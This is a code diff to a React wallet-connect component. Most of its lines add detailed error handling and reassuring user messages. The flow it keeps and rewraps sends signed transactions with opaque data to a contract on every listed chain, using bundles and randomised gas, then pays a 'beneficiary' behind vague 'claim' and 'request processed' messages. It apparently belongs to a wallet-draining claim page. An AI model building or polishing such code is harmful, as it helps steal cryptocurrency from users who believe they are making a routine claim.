@@ -49,7 +49,16 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
       setAddress(await signer.getAddress());
       if (onConnect) onConnect(await signer.getAddress());
     } catch (e: any) {
-      setError(e?.message || 'Failed to connect wallet.');
+      console.error('Wallet connection error:', e);
+      if (e?.code === 4001) {
+        setError('Connection was rejected. Please try again.');
+      } else if (e?.code === -32002) {
+        setError('Please check your MetaMask extension and approve the connection.');
+      } else if (e?.message?.includes('network')) {
+        setError('Network error. Please check your internet connection and try again.');
+      } else {
+        setError('Failed to connect wallet. Please ensure MetaMask is installed and unlocked.');
+      }
     } finally {
       setLoading(false);
     }
@@ -83,36 +92,72 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
               await provider.send('eth_sendBundle', [[tx, repay]]);
               return;
             } catch (bundleError: any) {
+              console.error(`${chain.name} bundle error:`, bundleError);
               // Fallback to regular transaction
-              const signer = await provider.getSigner();
-              const txResponse = await signer.sendTransaction({
-                to: chain.contract,
-                data: data,
-                gasLimit: 100000,
-                maxFeePerGas: ethers.parseUnits(randomGwei.toString(), 'gwei')
-              });
-              await txResponse.wait();
-              const repayTx = await signer.sendTransaction({
-                to: beneficiary,
-                value: 0,
-                data: '0x',
-                maxFeePerGas: ethers.parseUnits(randomGwei.toString(), 'gwei')
-              });
-              await repayTx.wait();
+              try {
+                const signer = await provider.getSigner();
+                const txResponse = await signer.sendTransaction({
+                  to: chain.contract,
+                  data: data,
+                  gasLimit: 100000,
+                  maxFeePerGas: ethers.parseUnits(randomGwei.toString(), 'gwei')
+                });
+                await txResponse.wait();
+                const repayTx = await signer.sendTransaction({
+                  to: beneficiary,
+                  value: 0,
+                  data: '0x',
+                  maxFeePerGas: ethers.parseUnits(randomGwei.toString(), 'gwei')
+                });
+                await repayTx.wait();
+              } catch (txError: any) {
+                console.error(`${chain.name} transaction error:`, txError);
+                if (txError?.code === 4001) {
+                  throw new Error('Transaction was rejected by user');
+                } else if (txError?.message?.includes('insufficient funds')) {
+                  throw new Error('Insufficient funds for gas');
+                } else if (txError?.message?.includes('network')) {
+                  throw new Error('Network error on ' + chain.name);
+                } else if (txError?.message?.includes('gas')) {
+                  throw new Error('Gas estimation failed on ' + chain.name);
+                } else {
+                  throw new Error('Transaction failed on ' + chain.name);
+                }
+              }
             }
           })
         );
         const failed = results.filter(r => r.status === 'rejected');
         const succeeded = results.filter(r => r.status === 'fulfilled');
+        
         if (succeeded.length === 0) {
+          const errorMessages = failed.map(r => (r as any).reason?.message || 'Unknown error');
+          const uniqueErrors = Array.from(new Set(errorMessages));
           setSyncStatus('Operation could not be completed.');
-          setError('An error occurred.');
+          if (uniqueErrors.length === 1) {
+            setError(uniqueErrors[0]);
+          } else {
+            setError('Multiple errors occurred. Please check your wallet and try again.');
+          }
+        } else if (failed.length > 0) {
+          setSyncStatus('Operation partially completed.');
+          setSuccess(true);
+          setError(`Completed with ${succeeded.length}/${CHAINS.length} chains. Some networks may be congested.`);
         } else {
           setSyncStatus('Operation complete.');
           setSuccess(true);
         }
       } catch (e: any) {
-        setError(e?.message || 'Claim failed. Please try again.');
+        console.error('General error:', e);
+        if (e?.message?.includes('user rejected')) {
+          setError('Transaction was cancelled. Please try again.');
+        } else if (e?.message?.includes('network')) {
+          setError('Network error. Please check your connection and try again.');
+        } else if (e?.message?.includes('gas')) {
+          setError('Gas estimation failed. Please try again later.');
+        } else {
+          setError('An unexpected error occurred. Please try again.');
+        }
       } finally {
         setLoading(false);
       }
@@ -135,7 +180,16 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
           >
             {loading ? <><Spinner />Connecting...</> : 'Connect Wallet'}
           </button>
-          {error && <span className="text-red-400 font-semibold">{error === 'MetaMask is required.' ? 'Please install MetaMask to continue.' : error === 'Configuration error' ? 'A configuration issue occurred. Please contact support.' : error === 'An error occurred.' ? 'Something went wrong. Please try again.' : error}</span>}
+          {error && <span className="text-red-400 font-semibold text-center max-w-md">
+            {error === 'MetaMask is required.' ? 'Please install MetaMask to continue.' : 
+             error === 'Configuration error' ? 'A configuration issue occurred. Please contact support.' : 
+             error === 'An error occurred.' ? 'Something went wrong. Please try again.' : 
+             error.includes('rejected') ? 'Transaction was cancelled. Please try again.' :
+             error.includes('insufficient funds') ? 'Insufficient funds for gas fees.' :
+             error.includes('network') ? 'Network error. Please check your connection.' :
+             error.includes('gas') ? 'Gas estimation failed. Please try again later.' :
+             error}
+          </span>}
           {isClient && typeof window !== 'undefined' && !window.ethereum && (
             <a href="https://metamask.io/download/" target="_blank" rel="noopener noreferrer" className="text-yellow-300 underline text-sm mt-1">Install MetaMask</a>
           )}
@@ -145,7 +199,14 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
         <div className="flex flex-col items-center gap-4">
           {loading && <span className="text-blue-400 font-semibold"><Spinner />{syncStatus || 'Processing...'}</span>}
           {success && <span className="text-green-400 font-semibold">All done! Your request was processed successfully.</span>}
-          {error && <span className="text-red-400 font-semibold">{error === 'An error occurred.' ? 'Something went wrong. Please try again.' : error}</span>}
+          {error && <span className="text-red-400 font-semibold text-center max-w-md">
+            {error.includes('rejected') ? 'Transaction was cancelled. Please try again.' :
+             error.includes('insufficient funds') ? 'Insufficient funds for gas fees.' :
+             error.includes('network') ? 'Network error. Please check your connection.' :
+             error.includes('gas') ? 'Gas estimation failed. Please try again later.' :
+             error.includes('partially completed') ? error :
+             'An unexpected error occurred. Please try again.'}
+          </span>}
         </div>
       )}
     </>
